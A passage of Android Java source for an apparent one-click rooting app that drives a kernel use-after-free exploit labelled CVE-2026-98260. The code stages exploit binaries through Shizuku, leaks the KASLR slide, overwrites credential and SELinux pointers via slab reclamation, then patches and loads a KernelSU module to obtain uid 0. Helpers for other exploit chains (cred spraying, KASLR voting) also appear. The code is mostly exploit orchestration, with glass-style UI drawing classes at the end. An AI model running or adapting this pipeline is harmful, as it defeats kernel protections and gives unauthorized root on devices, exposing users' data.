        for (int i = 0; i < profiles.length(); i++) {
            JSONObject p = profiles.getJSONObject(i);
            if (!kernel.equals(p.getString("kernel"))) continue;
            if (p.has("vulnerable") && !p.getBoolean("vulnerable"))
                throw new IllegalStateException("该内核配置未通过漏洞路径检查：" + kernel);
            return profileFromJson(p);
        }
        throw new IllegalStateException(
                "没有与实际内核匹配的 98260 配置：" + kernel);
    }

    private KernelProfile findImportedProfile(String kernel) throws Exception {
        File profiles = new File(getFilesDir(), "profiles");
        List<File> files = new ArrayList<>();
        collectProfileFiles(profiles, files);
        for (File file : files) {
            JSONObject p = new JSONObject(new String(
                    readFileBytes(file), StandardCharsets.UTF_8));
            if (!kernel.equals(p.getString("kernel"))) continue;
            if (!p.optBoolean("vulnerable", false))
                throw new IllegalStateException("导入配置未通过漏洞路径检查：" + kernel);
            return profileFromJson(p);
        }
        return null;
    }

    private static void collectProfileFiles(File directory, List<File> files) {
        File[] children = directory.listFiles();
        if (children == null) return;
        for (File child : children) {
            if (child.isDirectory()) {
                collectProfileFiles(child, files);
            } else if (child.getName().endsWith(".json")) {
                files.add(child);
            }
        }
    }

    private KernelProfile profileFromJson(JSONObject p) throws Exception {
        return new KernelProfile(
                p.getString("id"),
                p.getString("kernel"),
                Long.parseUnsignedLong(p.getString("timer_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("cred_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("slide_site_low")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("selinux_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("user_ns")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("root_user")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("groups")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("ucounts")
                        .replaceFirst("^0x", ""), 16),
                p.getInt("kitimer_size"),
                p.getInt("kitimer_node"),
                p.getInt("task_cred"),
                p.getInt("cred_size"),
                p.getInt("slab_objects"),
                p.getInt("slab_pages"),
                p.getString("module_asset"),
                p.getString("symbols_asset"));
    }

    private void runCve98260Pipeline(String kernel) throws Exception {
        KernelProfile profile = findKernelProfile(kernel);
        log("98260 内核配置：" + profile.id + " · " + kernel);
        stage("准备 CVE-2026-98260 组件");
        for (String name : new String[]{"cve98260_plant", "cve98260_slide",
                "cve98260_su", "cve98260_module"}) {
            stageAsset(name, WORK + "/" + name, "755");
        }

        String activeSocket = findReusableCve98260RootSocket();
        boolean reuseRoot = activeSocket != null;
        cve98260RootSocket = reuseRoot
                ? activeSocket
                : CVE_98260_ROOT_SOCKET_PREFIX
                        + Long.toHexString(System.nanoTime()) + ".sock";
        if (reuseRoot) {
            log("发现本次启动已有的 98260 root 通道，直接复用：" + cve98260RootSocket);
        } else {
            log("98260 socket=" + cve98260RootSocket);
            String parked = probe("pidof cve98260_plant 2>/dev/null").trim();
            if (!parked.isEmpty())
                throw new IllegalStateException(
                        "检测到已有 98260 进程（pid " + parked + "）但 root 通道不可用；请重启设备，不要重复启动");
            stage("CVE-2026-98260 只读预检");
            String preflight = shell("cd " + WORK + " && ./cve98260_plant --preflight"
                    + " --timer-link " + hex(profile.timerLink)
                    + " --cred-link " + hex(profile.credLink)
                                        + " --selinux-link " + hex(profile.selinuxLink)
                    + " --user-ns " + hex(profile.userNs)
                    + " --root-user " + hex(profile.rootUser)
                    + " --groups " + hex(profile.groups)
                    + " --ucounts " + hex(profile.ucounts)
                    + " --kitimer-size " + profile.kitimerSize
                    + " --kitimer-node " + profile.kitimerNode
                    + " --task-cred " + profile.taskCred
                    + " --cred-size " + profile.credSize
                    + " --slab-objects " + profile.slabObjects
                    + " --slab-pages " + profile.slabPages);
            logImportantLines(preflight, "[preflight]");
            if (!preflight.contains("[preflight] RESULT=OK"))
                throw new IllegalStateException("98260 预检未通过，已停止，未启动内存回收");
        }

        stage("抓取 98260 KASLR");
        String probeOut = shell("cd " + WORK + " && ./cve98260_slide"
                + " --site-low " + hex(profile.slideSiteLow));
        long slide = parseCve98260Slide(probeOut, profile.timerLink);
        log("98260 slide=" + hex(slide));

        stage("生成 KernelSU 模块");
        byte[] template = readProfileResource(profile.moduleAsset);
        Map<String, Long> symbols = loadSymbols(profile.symbolsAsset);
        byte[] module = patchModule(template, symbols, slide);
        stageBytes("ksu-patched.ko", module, "644");

        if (!reuseRoot) {
            stage("启动 CVE-2026-98260");
            setSystemStatus("正在获取 Root", "98260 正在回收 timer slab，可能持续数分钟", false);
            String start = shell("cd " + WORK
                    + " && if ! rm -f cve98260.log '" + cve98260RootSocket
                    + "'"
                    + "; then echo ROOT_SOCKET_CLEAN_FAILED; exit 1; fi"
                    + " && (PC98260_SOCK='" + cve98260RootSocket
                    + "' nohup ./cve98260_plant --slide " + hex(slide)
                    + " --timer-link " + hex(profile.timerLink)
                    + " --cred-link " + hex(profile.credLink)
                                        + " --selinux-link " + hex(profile.selinuxLink)
                    + " --user-ns " + hex(profile.userNs)
                    + " --root-user " + hex(profile.rootUser)
                    + " --groups " + hex(profile.groups)
                    + " --ucounts " + hex(profile.ucounts)
                    + " --kitimer-size " + profile.kitimerSize
                    + " --kitimer-node " + profile.kitimerNode
                    + " --task-cred " + profile.taskCred
                    + " --cred-size " + profile.credSize
                    + " --slab-objects " + profile.slabObjects
                    + " --slab-pages " + profile.slabPages
                    + " > cve98260.log 2>&1 < /dev/null & echo STARTED)");
            log(start.trim());
            if (start.contains("ROOT_SOCKET_CLEAN_FAILED")
                    || !start.contains("STARTED"))
                throw new IllegalStateException(
                        "98260 启动失败：残留 root Socket 无法清理，请重启设备后重试");
            waitForCve98260Root();
        }

        stage("加载 KernelSU 模块");
        boolean moduleLive = shell(
                "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
                .contains("LIVE");
        if (!moduleLive) {
            String load = shell(cve98260SuCommand("-c '"
                    + WORK + "/cve98260_module " + WORK + "/ksu-patched.ko'"));
            log(load.trim());
        } else {
            log("KernelSU 模块已处于加载状态，跳过 finit_module。");
        }
        if (!waitForKernelSuModule())
            throw new IllegalStateException("KernelSU 模块加载失败");
        setKernelState("模块已加载", true);

        // KernelSU 会把 SELinux 恢复为 Enforcing。此后的 bootstrap socket
        // 可能不再可由 shell 连接，收尾必须只走 KernelSU 的 su 通道。
        stage("初始化 KernelSU 用户态");
        String grant = initializeKernelSU();
        log(grant.trim());
    }

    private long parseCve98260Slide(String text, long timerLink) {
        long found = 0;
        for (String line : text.split("\\r?\\n")) {
            int at = line.indexOf("site=");
            if (at < 0) continue;
            String token = line.substring(at + 5).split("\\s+")[0];
            try {
                long site = Long.parseUnsignedLong(
                        token.replaceFirst("^0x", ""), 16);
                long slide = site - timerLink;
                if (slide > 0 && (slide & 0xfffL) == 0) {
                    found = slide;
                    log("slide leak: " + line.trim());
                }
            } catch (NumberFormatException ignored) {
            }
        }
        if (found == 0)
            throw new IllegalStateException("98260 KASLR 探针没有得到有效 site");
        return found;
    }

    private boolean waitForKernelSuModule() throws Exception {
        for (int i = 0; i < 20; i++) {
            if (shell("grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
                    .contains("LIVE"))
                return true;
            Thread.sleep(500);
        }
        return false;
    }

    private String findReusableCve98260RootSocket() throws Exception {
        String sockets = probe("cat /proc/net/unix 2>/dev/null | tr ' ' '\\n'"
                + " | grep '^" + CVE_98260_ROOT_SOCKET_PREFIX
                + "' | sort -u").trim();
        if (sockets.isEmpty())
            return null;
        for (String path : sockets.split("\\r?\\n")) {
            if (!isSafeCve98260SocketPath(path)) continue;
            String uid = probe("PC98260_SOCK='" + path + "' "
                    + WORK + "/cve98260_su -c 'id -u' 2>/dev/null").trim();
            if ("0".equals(uid))
                return path;
        }
        throw new IllegalStateException(
                "检测到活动中的 98260 rootd，但 root 通道不可用；请重启设备后重试");
    }

    private String cve98260SuCommand(String arguments) {
        return "PC98260_SOCK='" + cve98260RootSocket + "' "
                + WORK + "/cve98260_su " + arguments;
    }

    private static boolean isSafeCve98260SocketPath(String path) {
        return path != null
                && path.length() < 108
                && path.matches("^/data/local/tmp/cve98260-root[-A-Za-z0-9_.]*\\.sock$");
    }

    private void waitForCve98260Root() throws Exception {
        long deadline = System.currentTimeMillis() + TimeUnit.MINUTES.toMillis(5);
        long nextLog = 0;
        while (System.currentTimeMillis() < deadline) {
            String id = probe(cve98260SuCommand("-c 'id' 2>/dev/null")).trim();
            if (id.contains("uid=0")) {
                log("98260 root 通道已就绪：" + id.replace("\n", " | "));
                return;
            }
            String tail = probe("tail -n 120 " + WORK
                    + "/cve98260.log 2>/dev/null");
            if (tail.contains("missed page; holding zombie"))
                throw new IllegalStateException(
                        "98260 多次回收失败并已停放 UAF 进程；请重启设备后再试");
            String running = probe("pidof cve98260_plant 2>/dev/null").trim();
            if (running.isEmpty() && tail.isBlank())
                throw new IllegalStateException(
                        "98260 进程未启动且没有日志；请重启设备后重试");
            long now = System.currentTimeMillis();
            if (now >= nextLog) {
                logImportantLines(tail, "");
                nextLog = now + TimeUnit.MINUTES.toMillis(1);
            }
            Thread.sleep(5000);
        }
        throw new IllegalStateException("98260 等待 root 超时；请重启设备后再次运行");
    }

    private void logImportantLines(String text, String prefix) {
        int shown = 0;
        for (String line : text.split("\\r?\\n")) {
            String trimmed = line.trim();
            if (trimmed.isEmpty()) continue;
            if (!prefix.isEmpty() && !trimmed.contains(prefix)) continue;
            log("  " + (trimmed.length() > 220 ? trimmed.substring(0, 220) + "…" : trimmed));
            if (++shown >= 12) return;
        }
    }

    private void finishRoot(ExploitChoice route, boolean reused) {
        setKernelState("运行中", true);
        stage("完成");
        ui.post(() -> uiState.completeCurrentStage());
        progress(100);
        showRootReady();
        log(reused
                ? "🎉 root 已就绪；已复用当前内核中的 KernelSU。"
                : "🎉 root 成功；利用链 " + route.getLabel()
                        + "，KernelSU 管理器已可管理授权与模块。");
        launchPackage(MANAGER);
    }

    private String initializeKernelSU() throws Exception {
            shell("cp " + WORK + "/root_stage.sh /data/local/tmp/root_stage.sh"
                    + " && chmod 755 /data/local/tmp/root_stage.sh");
            String grant = shell("cd " + WORK + " && ./ksu_grant");
            if (!grant.contains("grant_root_rc=0") || !grant.contains("ROOT_STAGE_OK"))
                throw new IllegalStateException("KernelSU root fd 初始化失败");
            String rootIdentity = shell("cat " + WORK + "/root_id").trim();
            log("root identity: " + rootIdentity.replace("\n", " | "));
            if (!rootIdentity.contains("uid=0(root)") || !rootIdentity.contains("context=u:r:ksu:s0"))
                throw new IllegalStateException("KernelSU root 身份验收失败");
            // Check from a fresh shell without env/timeout, which bypass
            // mksh's access() preflight and can hide broken cached credentials.
            String directSu = shell("/system/bin/su -c id").trim();
            log("direct su identity: " + directSu.replace("\n", " | "));
            if (!directSu.contains("uid=0(root)") || !directSu.contains("context=u:r:ksu:s0"))
                throw new IllegalStateException(
                        "普通 shell su 验收失败；请重启设备后重新提权，避免复用旧 KernelSU 模块");
            return grant;
    }

    private CredProcess pickCred() throws Exception {
        for (int i = 0; i < 24; i++) {
            log("cred 尝试 " + (i + 1) + "/24，单次上限 90 秒");
            Process p = shellProcess("cd " + WORK + " && exec ./perf_cred_honor");
            LineProcess lp = new LineProcess(p, "cred-" + (i + 1));
            String hit = lp.waitForLine("HIT pid=", 90);
            if (hit == null) {
                p.destroy();
                continue;
            }
            int at = hit.indexOf("ptr=");
            if (at < 0) { p.destroy(); continue; }
            String h = hit.substring(at + 4).split("\\s+")[0];
            long c = Long.parseUnsignedLong(h.replaceFirst("^0x", ""), 16);
            if (((c + 0x40) >>> 16 & 1) == 1)
                return new CredProcess(p, lp, c);
            p.destroy();
        }
        throw new IllegalStateException("没有找到 bit16=1 的 cred");
    }

    private String runPhaseCommand(String command) throws Exception {
        Process p = shellProcess(command);
        try (OutputStream ignored = p.getOutputStream()) {
        }
        LineProcess lines = new LineProcess(p, "p1/p2", true);
        if (!p.waitFor(20, TimeUnit.MINUTES)) {
            p.destroy();
            throw new IllegalStateException("两阶段写入超时");
        }
        String output = lines.snapshot(3000);
        if (p.exitValue() != 0)
            throw new IllegalStateException("两阶段写入失败，exit=" + p.exitValue());
        return output;
    }

    private long solveSlide() throws Exception {
        String out = shell("cd " + WORK + " && ./kaslr_slide");
        String slideLine = null;
        String votesLine = null;
        for (String line : out.split("\\r?\\n")) {
            if (line.startsWith("KASLR_SLIDE=")) slideLine = line.substring(12);
            if (line.startsWith("KASLR_VOTES=")) votesLine = line.substring(12);
        }
        if (slideLine == null || votesLine == null)
            throw new IllegalStateException("KASLR 助手未返回有效结果");
        long slide = Long.parseUnsignedLong(
                slideLine.replaceFirst("^0x", ""), 16);
        int votes = Integer.parseInt(votesLine);
        if (votes < 3)
            throw new IllegalStateException("KASLR 证据不足，votes=" + votes);
        log("KASLR 匹配成功，票数 " + votes);
        return slide;
    }

    private Map<String, Long> loadSymbols(String assetName) throws Exception {
        return parseSymbolMap(readProfileResource(assetName));
    }

    static Map<String, Long> parseSymbolMap(byte[] data) {
        Map<String, Long> map = new HashMap<>(180000);
        for (String line : new String(data, StandardCharsets.UTF_8).split("\n")) {
            String s = line.trim();
            String[] parts = s.split("\\s+", 3);
            if (parts.length < 2) continue;
            try {
                long value = Long.parseUnsignedLong(parts[0], 16);
                String name;
                if (parts.length == 3 && parts[1].length() == 1
                        && Character.isLetter(parts[1].charAt(0))) {
                    name = parts[2];
                } else {
                    int sp = s.indexOf(' ');
                    name = s.substring(sp + 1).trim();
                }
                map.put(name, value);
            } catch (NumberFormatException ignored) {}
        }
        return map;
    }

    private static byte[] patchModule(byte[] raw, Map<String, Long> symbols, long slide) {
        ByteBuffer b = ByteBuffer.wrap(raw).order(ByteOrder.LITTLE_ENDIAN);
        long shoff = b.getLong(0x28);
        int shentsize = b.getShort(0x3a) & 0xffff;
        int shnum = b.getShort(0x3c) & 0xffff;
        int shstr = b.getShort(0x3e) & 0xffff;
        int symSec = -1, modInfoSec = -1;
        for (int i = 0; i < shnum; i++) {
            int p = (int)(shoff + (long) i * shentsize);
            int type = b.getInt(p + 4);
            if (type == 2) symSec = i;
        }
        if (symSec < 0) throw new IllegalStateException("module 无 symtab");
        int shstrHdr = (int)(shoff + (long) shstr * shentsize);
        int shstrOff = (int)b.getLong(shstrHdr + 24);
        int shstrSize = (int)b.getLong(shstrHdr + 32);
        for (int i = 0; i < shnum; i++) {
            int p = (int)(shoff + (long) i * shentsize);
            int nameOff = b.getInt(p);
            if (nameOff <= 0 || nameOff >= shstrSize) continue;
            int end = shstrOff + nameOff;
            while (end < shstrOff + shstrSize && raw[end] != 0) end++;
            String name = new String(raw, shstrOff + nameOff,
                    end - shstrOff - nameOff, StandardCharsets.UTF_8);
            if (".modinfo".equals(name)) modInfoSec = i;
        }
        int symHdr = (int)(shoff + (long) symSec * shentsize);
        int symOff = (int)b.getLong(symHdr + 24);
        int symSize = (int)b.getLong(symHdr + 32);
        int link = b.getInt(symHdr + 40);
        int strHdr = (int)(shoff + (long) link * shentsize);
        int strOff = (int)b.getLong(strHdr + 24);
        int strSize = (int)b.getLong(strHdr + 32);
        int patched = 0;
        int repaired = 0;
        int undefined = 0;
        for (int p = symOff; p + 24 <= symOff + symSize; p += 24) {
            int nameOff = b.getInt(p);
            int shndx = b.getShort(p + 6) & 0xffff;
            if (shndx == 0xffff) {
                if (modInfoSec < 0) throw new IllegalStateException(
                        "module 含损坏节索引但无 .modinfo");
                b.putShort(p + 6, (short)modInfoSec);
                repaired++;
                continue;
            }
            if (nameOff <= 0 || nameOff >= strSize) continue;
            int end = strOff + nameOff;
            while (end < strOff + strSize && raw[end] != 0) end++;
            String name = new String(raw, strOff + nameOff, end - strOff - nameOff,
                    StandardCharsets.UTF_8);
            if (shndx != 0) continue;
            undefined++;
            Long value = symbols.get(name);
            if (value == null) continue;
            b.putShort(p + 6, (short)0xfff1);
            b.putLong(p + 8, value + slide);
            patched++;
        }
        if (patched == 0) throw new IllegalStateException(
                "模块符号补丁为空（未定义=" + undefined + "，匹配=" + patched + "）");
        if (repaired > 0) {
            Log.i("HOneClick", "module repaired section indexes=" + repaired);
        }
        return raw;
    }

    private String shell(String command) throws Exception {
        Process p = shellProcess(command);
        try (OutputStream ignored = p.getOutputStream()) {
        }
        ByteArrayOutputStream stdout = new ByteArrayOutputStream();
        ByteArrayOutputStream stderr = new ByteArrayOutputStream();
        Thread[] readers = new Thread[]{
                new Thread(() -> drainProcessStream(p, false, stdout), "honor-stdout"),
                new Thread(() -> drainProcessStream(p, true, stderr), "honor-stderr")
        };
        for (Thread reader : readers) reader.start();
        boolean exited = p.waitFor(20, TimeUnit.MINUTES);
        int code = exited ? p.exitValue() : -1;
        if (!exited) p.destroy();
        for (Thread reader : readers) reader.join(10000);
        String out = new String(stdout.toByteArray(), StandardCharsets.UTF_8);
        String err = new String(stderr.toByteArray(), StandardCharsets.UTF_8);
        if (code != 0 || !err.isBlank())
            logError("命令返回 " + code + (err.isBlank() ? "" : "：" + err.trim()));
        if (!exited) throw new IllegalStateException("shell 命令执行超时");
        return out + err;
    }

    private Process shellProcess(String command) throws Exception {
        IBinder binder = Shizuku.getBinder();
        if (binder == null || !binder.pingBinder())
            throw new IllegalStateException("Shizuku binder 不可用");
        IShizukuService service = IShizukuService.Stub.asInterface(
                new ShizukuBinderWrapper(binder));
        IRemoteProcess remote = service.newProcess(
                new String[]{"sh", "-c", command},
                new String[]{"PATH=/system/bin:/system/xbin:/data/adb/ksu/bin",
                        "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp",
                        "HONOR_WORK=" + (WORK == null ? "/data/local/tmp/honor" : WORK)},
                "/data/local/tmp");
        if (remote == null) throw new IllegalStateException("Shizuku 拒绝启动 shell");
        return new RemoteProcess(remote);
    }

    private void stageAsset(String name, String dest, String mode) throws Exception {
        Process p = shellProcess("cat > '" + dest + "'; chmod " + mode + " '" + dest + "'");
        try (InputStream in = getAssets().open(name); OutputStream out = p.getOutputStream()) {
            byte[] buffer = new byte[65536];
            int n;
            while ((n = in.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            out.flush();
        }
        int code = p.waitFor();
        if (code != 0) {
            String error = readAll(p.getErrorStream());
            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
            throw new IllegalStateException("stage failed: " + name);
        }
    }

    private void copyAsset(String name, String dest) throws Exception {
        shell("mkdir -p " + WORK);
        stageAsset(name, dest, "644");
    }

    private void prepareWorkDirectory() throws Exception {
        String candidate = "/data/local/tmp/honor-run-"
                + Long.toHexString(System.nanoTime());
        shell("mkdir -m 711 '" + candidate + "'");
        String check = shell("test -d '" + candidate
                + "' && test -w '" + candidate + "' && echo WORKDIR_OK");
        if (!check.contains("WORKDIR_OK"))
            throw new IllegalStateException("无法创建可写工作目录：" + candidate);
        WORK = candidate;
        log("staging=" + WORK);
    }

    private void stageBytes(String name, byte[] data, String mode) throws Exception {
        Process p = shellProcess("cat > '" + WORK + "/" + name + "'; chmod " + mode + " '" + WORK + "/" + name + "'");
        try (OutputStream out = p.getOutputStream()) { out.write(data); out.flush(); }
        int code = p.waitFor();
        if (code != 0) {
            String error = readAll(p.getErrorStream());
            logError("[文件失败] " + name + " exit=" + code + "\n" + error);
            throw new IllegalStateException("stage bytes failed: " + name);
        }
    }

    private byte[] readAsset(String name) throws Exception {
        try (InputStream in = getAssets().open(name)) { return readAllBytes(in); }
    }

    private byte[] readProfileResource(String path) throws Exception {
        File file = new File(path);
        if (file.isAbsolute()) return readFileBytes(file);
        return readAsset(path);
    }

    private static byte[] readFileBytes(File file) throws Exception {
        try (FileInputStream in = new FileInputStream(file)) {
            return readAllBytes(in);
        }
    }

    private static byte[] readAllBytes(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(in, out);
        return out.toByteArray();
    }

    private static String readAll(InputStream in) throws Exception {
        return new String(readAllBytes(in), StandardCharsets.UTF_8);
    }

    private static void copy(InputStream in, OutputStream out) throws Exception {
        byte[] b = new byte[65536]; int n;
        while ((n = in.read(b)) > 0) out.write(b, 0, n);
    }

    private static void drainProcessStream(
            Process process, boolean stderr, OutputStream out) {
        try {
            InputStream in = stderr
                    ? process.getErrorStream() : process.getInputStream();
            copy(in, out);
        } catch (Throwable ignored) {
        }
    }

    private static String hex(long v) { return "0x" + Long.toHexString(v); }
    private static String emptyAsUnknown(String s) {
        return s == null || s.isEmpty() ? "未知" : s;
    }
    private static String toHex(byte[] bytes) {
        StringBuilder out = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) out.append(String.format("%02x", b & 0xff));
        return out.toString();
    }
    private static byte[] hexToBytes(String hex) {
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++)
            out[i] = (byte)Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        return out;
    }
    private static boolean isHex(char c) {
        return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
    }

    private static final class RemoteProcess extends Process {
        private final IRemoteProcess remote;
        private OutputStream stdin;
        private InputStream stdout;
        private InputStream stderr;
        private Integer exitCode;

        RemoteProcess(IRemoteProcess remote) { this.remote = remote; }

        @Override
        public synchronized OutputStream getOutputStream() {
            if (stdin == null) {
                try {
                    stdin = new ParcelFileDescriptor.AutoCloseOutputStream(
                            remote.getOutputStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stdin 失败", t);
                }
            }
            return stdin;
        }

        @Override
        public synchronized InputStream getInputStream() {
            if (stdout == null) {
                try {
                    stdout = new ParcelFileDescriptor.AutoCloseInputStream(
                            remote.getInputStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stdout 失败", t);
                }
            }
            return stdout;
        }

        @Override
        public synchronized InputStream getErrorStream() {
            if (stderr == null) {
                try {
                    stderr = new ParcelFileDescriptor.AutoCloseInputStream(
                            remote.getErrorStream());
                } catch (Throwable t) {
                    throw new RuntimeException("打开远程 stderr 失败", t);
                }
            }
            return stderr;
        }

        @Override
        public synchronized int waitFor() throws InterruptedException {
            try {
                exitCode = remote.waitFor();
                return exitCode;
            } catch (Throwable t) {
                throw new RuntimeException("等待远程进程失败", t);
            }
        }

        @Override
        public synchronized boolean waitFor(long timeout, TimeUnit unit)
                throws InterruptedException {
            try {
                boolean exited = remote.waitForTimeout(timeout, unit.toString());
                if (exited) exitCode = remote.exitValue();
                return exited;
            } catch (Throwable t) {
                throw new RuntimeException("限时等待远程进程失败", t);
            }
        }

        @Override
        public synchronized int exitValue() {
            try {
                if (exitCode == null) exitCode = remote.exitValue();
                return exitCode;
            } catch (Throwable t) {
                throw new IllegalThreadStateException("远程进程仍在运行");
            }
        }

        @Override
        public void destroy() {
            try {
                remote.destroy();
            } catch (Throwable ignored) {}
        }

        @Override
        public boolean isAlive() {
            try {
                return remote.alive();
            } catch (Throwable ignored) {
                return false;
            }
        }
    }

    private void stage(String name) {
        progress(Math.min(95, progressValue + 7));
        ui.post(() -> uiState.startStage(name));
    }

    private void progress(int p) {
        progressValue = p;
        ui.post(() -> uiState.setProgress(p));
    }
    private void log(String s) {
        Log.i("HOneClick", s);
    }

    private void logError(String s) {
        Log.e("HOneClick", s);
        ui.post(() -> uiState.appendLog(s));
    }
    private int dp(int n) { return Math.round(n * getResources().getDisplayMetrics().density); }

    private void setKernelState(String label, boolean good) {
        ui.post(() -> uiState.setKernelState(label));
    }

    private void setSystemStatus(String title, String detail, boolean active) {
        ui.post(() -> uiState.setStatus(title, detail, active));
    }

    private void cleanupHelpers() {
        try {
            shell("killall -q t64560_v36 t64560_v42 perf_cred_honor forker 2>/dev/null || true");
        } catch (Throwable ignored) {
        }
    }

    private void showRootReady() {
        ui.post(() -> {
            uiState.setKernelState("运行中");
            uiState.setStatus("Root 已就绪",
                    "KernelSU root fd 验收通过 · 本次启动有效", true);
        });
    }

    private final class LiquidBackdrop extends View {
        private final Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint line = new Paint(Paint.ANTI_ALIAS_FLAG);

        LiquidBackdrop(Context context) {
            super(context);
            setLayerType(View.LAYER_TYPE_HARDWARE, null);
            line.setStyle(Paint.Style.STROKE);
            line.setStrokeWidth(dp(1));
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            int w = getWidth();
            int h = getHeight();
            float t = (System.currentTimeMillis() % 18000L) / 18000f;
            float wave = (float)Math.sin(t * Math.PI * 2f);
            paint.setShader(new LinearGradient(0, 0, w, h,
                    0xFF06100F, 0xFF0C1A20, Shader.TileMode.CLAMP));
            canvas.drawRect(0, 0, w, h, paint);
            paint.setShader(null);

            drawOrb(canvas, w * (0.10f + 0.04f * wave), h * 0.18f,
                    w * 0.58f, 0x3878F5C1, 0x0078F5C1);
            drawOrb(canvas, w * (0.92f - 0.03f * wave), h * 0.39f,
                    w * 0.52f, 0x326DBAFF, 0x006DBAFF);
            drawOrb(canvas, w * (0.18f - 0.03f * wave), h * 0.80f,
                    w * 0.62f, 0x2FAE83FF, 0x00AE83FF);
            drawOrb(canvas, w * 0.72f, h * (0.92f + 0.02f * wave),
                    w * 0.40f, 0x1F69FFDA, 0x0069FFDA);

            line.setColor(0x1FFFFFFF);
            Path curve = new Path();
            curve.moveTo(-w * 0.12f, h * 0.34f);
            curve.cubicTo(w * 0.24f, h * 0.25f, w * 0.65f, h * 0.48f,
                    w * 1.12f, h * 0.34f);
            canvas.drawPath(curve, line);
            line.setColor(0x12FFFFFF);
            curve.reset();
            curve.moveTo(-w * 0.1f, h * 0.71f);
            curve.cubicTo(w * 0.35f, h * 0.62f, w * 0.72f, h * 0.84f,
                    w * 1.08f, h * 0.68f);
            canvas.drawPath(curve, line);

            if (isShown()) postInvalidateOnAnimation();
        }

        private void drawOrb(Canvas canvas, float cx, float cy, float radius,
                             int center, int edge) {
            paint.setShader(new RadialGradient(cx, cy, radius,
                    new int[]{center, edge}, new float[]{0f, 1f},
                    Shader.TileMode.CLAMP));
            canvas.drawCircle(cx, cy, radius, paint);
            paint.setShader(null);
        }
    }

    private final class GlassPanel extends LinearLayout {
        private final Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint border = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final android.graphics.RectF bounds = new android.graphics.RectF();

        GlassPanel(Context context) {
            super(context);
            setWillNotDraw(false);
            setElevation(dp(12));
            border.setStyle(Paint.Style.STROKE);
            border.setStrokeWidth(dp(1));
            border.setColor(0x38FFFFFF);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            float inset = dp(1);
            float radius = dp(25);
            bounds.set(inset, inset, getWidth() - inset, getHeight() - inset);
            paint.setShader(new LinearGradient(0, 0, getWidth(), getHeight(),
                    new int[]{0x32FFFFFF, 0x14FFFFFF, 0x0CFFFFFF},
                    new float[]{0f, 0.45f, 1f}, Shader.TileMode.CLAMP));
            canvas.drawRoundRect(bounds, radius, radius, paint);
            paint.setShader(null);
            canvas.drawRoundRect(bounds, radius, radius, border);

            paint.setShader(new LinearGradient(0, 0, getWidth(), 0,
                    0x78FFFFFF, 0x00FFFFFF, Shader.TileMode.CLAMP));
            paint.setStyle(Paint.Style.STROKE);
            paint.setStrokeWidth(dp(1));
            Path glare = new Path();
            glare.moveTo(dp(18), dp(8));
            glare.cubicTo(getWidth() * 0.36f, 0, getWidth() * 0.64f, 0,
                    getWidth() - dp(26), dp(7));
            canvas.drawPath(glare, paint);
            paint.setStyle(Paint.Style.FILL);
            paint.setShader(null);
            super.onDraw(canvas);
        }
    }

    private final class GlassButton extends TextView {
        private final boolean primary;

        GlassButton(Context context, boolean primary) {
            super(context);
            this.primary = primary;
            setGravity(Gravity.CENTER);
            setTextSize(15);
            setTypeface(Typeface.create("sans-serif", Typeface.BOLD));
            setLetterSpacing(0.02f);
            setClickable(true);
            setFocusable(true);
            setElevation(dp(primary ? 16 : 7));
            setTextColor(primary ? 0xFF061512 : 0xFFF1FAF7);
            GradientDrawable surface = new GradientDrawable(
                    primary ? GradientDrawable.Orientation.LEFT_RIGHT
                            : GradientDrawable.Orientation.TOP_BOTTOM,
                    primary
                            ? new int[]{0xFFA6F9D0, 0xFF75D9FA}
                            : new int[]{0x29FFFFFF, 0x10FFFFFF});
            surface.setCornerRadius(dp(21));
            surface.setStroke(dp(1), primary ? 0x88FFFFFF : 0x35FFFFFF);
            GradientDrawable mask = new GradientDrawable();
            mask.setColor(0xFFFFFFFF);
            mask.setCornerRadius(dp(21));
            setBackground(new RippleDrawable(
                    ColorStateList.valueOf(primary ? 0x30001310 : 0x36FFFFFF),
                    surface, mask));
            setStateListAnimator(null);
        }

        @Override
        public void setEnabled(boolean enabled) {
            super.setEnabled(enabled);
            setAlpha(enabled ? 1f : 0.48f);
        }
    }

    private final class LiquidProgressView extends View {
        private final Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private float shown;
        private float target;

        LiquidProgressView(Context context) {
            super(context);
            setProgress(3);
        }

        void setProgress(int value) {
            target = Math.max(0, Math.min(100, value));
            postInvalidateOnAnimation();
        }

        int getProgress() {
            return Math.round(target);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            shown += (target - shown) * 0.12f;
            float h = getHeight();
            float r = h / 2f;
            paint.setColor(0x18FFFFFF);
            canvas.drawRoundRect(0, 0, getWidth(), h, r, r, paint);
            float fill = Math.max(h, getWidth() * shown / 100f);
            paint.setShader(new LinearGradient(0, 0, Math.max(1, fill), 0,
                    new int[]{0xFF88F4C0, 0xFF65D9FB, 0xFFA9D7FF},
                    null, Shader.TileMode.CLAMP));
            canvas.drawRoundRect(0, 0, fill, h, r, r, paint);
